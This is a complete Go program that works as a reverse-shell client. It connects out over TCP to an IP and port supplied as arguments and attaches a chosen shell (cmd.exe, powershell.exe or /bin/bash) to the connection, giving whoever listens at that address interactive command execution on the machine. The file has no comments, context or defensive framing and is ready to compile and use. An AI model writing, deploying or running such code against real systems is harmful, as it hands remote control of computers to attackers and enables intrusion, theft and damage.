package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
)

type Command struct {
	Program string
	Args    []string
	Cmd     *exec.Cmd
}

func (c *Command) exec(conn net.Conn) {
	c.Cmd = exec.Command(c.Program, c.Args...)
	c.Cmd.Stdin = conn
	c.Cmd.Stdout = conn
	c.Cmd.Stderr = conn
	c.Cmd.Run()
}

func connect(ip string, port int) net.Conn {
	connectStr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("tcp", connectStr)
	if err != nil {
		fmt.Printf("couldn't connect to %s...\n", connectStr)
	}
	return conn
}

func main() {
	thisProgram := os.Args[0]
	if len(os.Args[:]) < 4 {
		fmt.Println(fmt.Sprintf("usage: %s <ip> <port> <cmd.exe|powershell.exe|/bin/bash [args...]", thisProgram))
		return
	}

	ip, port, shell, shellArgs := os.Args[1], os.Args[2], os.Args[3], os.Args[4:]

	c := Command{
		Program: shell,
		Args:    shellArgs,
	}

	portAsInt, _ := strconv.Atoi(port)
	conn := connect(ip, portAsInt)
	c.exec(conn)
}
